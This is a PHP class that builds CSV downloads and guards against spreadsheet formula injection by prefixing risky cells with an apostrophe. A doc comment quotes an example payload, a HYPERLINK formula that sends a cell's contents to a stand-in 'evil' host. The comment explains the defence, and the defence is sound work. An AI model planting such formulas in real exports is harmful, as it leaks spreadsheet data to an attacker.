<?php

declare(strict_types=1);

namespace Macrolab;

use RuntimeException;

/**
 * CSV for download, built with fputcsv so that quoting is RFC 4180-correct
 * rather than something hand-rolled that breaks on the first note containing a
 * comma.
 */
final class Csv
{
    /** Excel on Windows reads a BOM-less UTF-8 file as the local codepage. */
    public const BOM = "\xEF\xBB\xBF";

    /**
     * @param list<string>          $header
     * @param iterable<list<mixed>> $rows
     * @param string                $separator ',' or ';' - the latter is what
     *                                         Excel with Dutch and most other
     *                                         European regional settings expects
     */
    public static function fromRows(array $header, iterable $rows, string $separator = ','): string
    {
        $stream = fopen('php://temp', 'r+');

        if ($stream === false) {
            throw new RuntimeException('Could not open a temporary stream to build the CSV.');
        }

        fputcsv($stream, array_map([self::class, 'cell'], $header), $separator);

        foreach ($rows as $row) {
            fputcsv($stream, array_map([self::class, 'cell'], $row), $separator);
        }

        rewind($stream);
        $body = (string) stream_get_contents($stream);
        fclose($stream);

        return self::BOM . $body;
    }

    /**
     * One cell, made safe to open in a spreadsheet.
     *
     * Excel, LibreOffice and Sheets all evaluate a cell beginning with =, +, -
     * or @ as a formula, so =HYPERLINK("http://evil/?x="&A1,"click") in a note
     * runs when the file is opened. A leading apostrophe neutralises it.
     *
     * Applied to every value rather than only to the fields that look risky:
     * both the note and the display name are written by people, it costs
     * nothing, and a rule with no exceptions cannot be forgotten later.
     */
    public static function cell(mixed $value): string
    {
        if ($value === null) {
            return '';
        }

        if (is_bool($value)) {
            return $value ? 'yes' : 'no';
        }

        $text = (string) $value;

        // Control characters serve no purpose in a cell and confuse readers.
        $text = (string) preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $text);

        if ($text !== '' && str_contains("=+-@\t\r", $text[0])) {
            return "'" . $text;
        }

        return $text;
    }
}
